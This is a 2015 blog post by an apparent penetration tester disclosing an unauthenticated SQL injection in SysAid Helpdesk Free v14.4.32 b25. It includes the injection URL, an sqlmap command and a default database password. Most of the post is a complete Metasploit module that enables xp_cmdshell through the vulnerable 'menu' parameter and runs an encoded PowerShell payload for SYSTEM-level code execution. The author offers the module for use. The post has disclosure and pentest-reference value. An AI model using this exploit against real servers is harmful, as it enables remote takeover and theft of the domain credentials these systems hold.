---
layout: post
title: Unauthenticated SQL Injection in Sysaid Helpdesk Free v.14.4.32. b25
date: '2015-09-29T10:18:00.001-07:00'
author: Hland
tags:
- exploit
- Sysaid
- SQLi
modified_time: '2017-03-25T01:28:49.790-07:00'
thumbnail: https://i.ytimg.com/vi/hbxL0UvYrdE/default.jpg
blogger_id: tag:blogger.com,1999:blog-3264165303439231899.post-3357278205645230439
blogger_orig_url: https://blankhat.blogspot.com/2015/09/unauthenticated-sql-injection-in-sysaid.html
---

Discovered: June 2015

This is a flaw that I came across at a pentest for a client, the flaw ended up giving us enterprise admin access which isn't too bad. 

This issue is fixed in later versions and it seems that Sysaid have become aware of the issue on their own. This writeup is mostly for my own reference and everybody out there doing penetration testing encountering old versions of the software inside company networks. 

## The product
<https://www.sysaid.com/>

This is helpdesk software made ofr for managing company support cases, providing remote support, and a bunch of other stuff. This software’s database can contain domain credentials that are encrypted using a hardcoded secret as mentioned in the referenced CVEs. This makes it a high-value target that can give access to a large number of credentials and highly privileged accounts. The vulnerability will give facilitate remote code execution on the server as the SYSTEM user if the default configuration is in use. 


## The vulnerability

Sysaid is vulnerable to SQL injection at the following url:

```
http://sysaidserver:8080/api/v1/menu/menu_items?menu=main'WAITFOR+DELAY'0%3a0%3a10'--&all_tree=true
```


This makes it possible to dump the entire database using for instance SQLMap. To exploit the vulnerability successfully, SQLMap must be provided with a valid JSESSIONID cookie that will be set by the server upon first visit to the site. 

The following SQLMap command will detect and be able to exploit the injection vulnerability to return the user that the database commands are executed as:

```
sqlmap -u http://sysaidserver:8080/api/v1/menu/menu_items?menu=main*&all_tree=true --cookie="JSESSIONID=xxx" --current-user 
```

The database is by default running as SA and can therefore activate ```xp_cmdshell``` to run operating system commands with the privileges of the user the database is running as. By default this user is the SYSTEM user on Windows. 

Also the default “SA” user’s password is “Password1” which can be found in cleartext in the configuration files (CVE-2015-3001)

<iframe width="420" height="315" src="https://www.youtube.com/embed/hbxL0UvYrdE" frameborder="0" allowfullscreen></iframe>

## Previous Vulnerabilities in Sysaid Software
* SysAid Server Arbitrary File Disclosure (2014-12-23)
* Ilient SysAid 8.5.5 Multiple Cross Site Scripting and HTML Injection Vulnerabilities (2012-03-08) 
* Authenticated Blind SQL injection (2012-11-30)
* CVE-2015-2993, CVE-2015-2994, CVE-2015-2995, CVE-2015-2996, CVE-2015-2997, CVE-2015-2998,CVE-2015-2999,CVE-2015-3000,CVE-2015-3001, CVE-2014-9436, CVE-2008-2179, CVE-2007-5259



## Metasploit module

I wrote my first "real" Metasploit module to have a simple way to exploit this. As I have little to no experience with writing Metasploit modules and I'm not fluent in Ruby, it is a bit of a hack. But it should work and I hope someone can make use of it, I know I will the next time I encounter one of these installations..   

[Exploit](https://bitbucket.org/hland/metasploitmodules/raw/fcabc17fb0bd00bf3a095f68fe8e1457b8407103/sysaid_sqli.rb)

```
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/exploit/powershell'
require 'msf/core/exploit/mssql_commands'


class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Powershell
  include Msf::Exploit::Remote::HttpClient



  def initialize(info={})
    super(update_info(info,
      'Name'           => "Sysaid Helpdesk Software Unauthenticated SQLi",
      'Description'    => %q{
        This module exploits an unauthenticated SQLi vulnerability in the Sysaid 
        Helpdesk Free software. Because the "menu" parameter is not handled correctly,
        a malicious user can manipulate the SQL query, and allows
        arbitrary code execution under the context of 'SYSTEM' because the database
        runs as the SA user. This module uses a Metasploit generated Powershell payload and 
	uses xp_cmdshell, which is activated and then deactivated after exploitation.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Hland', 
        ],
      'References'     =>
        [
          ['CVE', 'xxxx'],
        ],
      'Payload'        =>
        {
          'BadChars' => "\x00"
        },
      'DefaultOptions'  =>
        {
          'InitialAutoRunScript' => 'migrate -f'
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          ['Sysaid Helpdesk <= v14.4.32 b25', {}]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Aug 29 2015",
      'DefaultTarget'  => 0,

))

      register_options(
        [
          OptPort.new('RPORT',     [true, "The web application's port", 8080]),
          OptString.new('TARGETURI', [true, 'The base path to to the web application', '/'])
        ], self.class)
  end

  def check

    peer = "#{rhost}:#{rport}"
    uri = target_uri.path
    uri = normalize_uri(uri,"Login.jsp")

    print_status("#{peer} - Checking for vulnerability")

    res = send_request_cgi({
      'method'    => 'GET',
      'uri'       => uri,
      'vars_get' => {
      }
    })

    v = res.body.scan(/\<title\>SysAid Help Desk Software\<\/title\>/)
    if not v
        vprint_error("Is this even a Sysaid Help Desk?")
        return Exploit::CheckCode::Safe
    else
        vprint_status("Identified system as Sysaid Help Desk")
	return Exploit::CheckCode::Appears

    end

    return Exploit::CheckCode::Unknown

  end

  def mssql_xpcmdshell(cmd,doprint=false,opts={})
    force_enable = false
    begin
      res = mssql_query("EXEC master..xp_cmdshell '#{cmd}'", doprint)
      #mssql_print_reply(res) if doprint

      return res

    rescue RuntimeError => e
      if(e.to_s =~ /xp_cmdshell disabled/)
        force_enable = true
        retry
      end
      raise e
    end
  end

  def exploit
    peer = "#{rhost}:#{rport}"
    uri = target_uri.path

    vprint_line("#{peer} - Getting a session token...")
    
    res = send_request_cgi({
      'method'    => 'GET',
      'uri'       => normalize_uri(uri, "Login.jsp"),
      'vars_get' => {
      }
    })

    vprint_line("#{peer} - Cookie's in the jar...")

    # Got a cookie, now ready to make exploiting requests
    if res && res.code == 200
        #vprint_line("#{res.headers}")
        cookies = res.get_cookies
        #vprint_line("#{cmd_psh_payload(payload.encoded, payload_instance.arch.first)}")
    else
        vprint_line("No 200 response? I'm outta here")
        return

    end

    # Put together the vulnerable URI
    uri = normalize_uri(uri,"api","v1","menu","menu_items")

    # Generate powershell payload as an encoded string
    powershell_payload = cmd_psh_payload(payload.encoded, payload_instance.arch.first, {:encode_final_payload => true, :remove_comspec => true})

    

    #
    # Inject payload and wait for shell
    #
    print_status("#{peer} - Trying to activate xp_cmdshell and exploit vulnerability")

    sqli = "main';exec master.dbo.sp_configure 'show advanced options',1;RECONFIGURE;exec master.dbo.sp_configure 'xp_cmdshell', 1;RECONFIGURE;EXEC master..xp_cmdshell '#{powershell_payload}';--"
    res = send_request_cgi({
      'method'    => 'GET',
      'uri'       => uri,
      'cookie'    => cookies,
      'vars_get' => {
        'menu' => sqli,
      }
    })


    # Deactivate XPCmdShell
    sqli = "main';exec sp_configure 'xp_cmdshell', 0 ;RECONFIGURE;exec sp_configure 'show advanced options', 0 ;RECONFIGURE;--"
    print_status("#{peer} - Deactivating xp_cmdshell to clean up after ourselves..")

    res = send_request_cgi({
      'method'    => 'GET',
      'uri'       => uri,
      'cookie'    => cookies,
      'vars_get' => {
        'menu' => sqli,
      }
    })

  end
end
```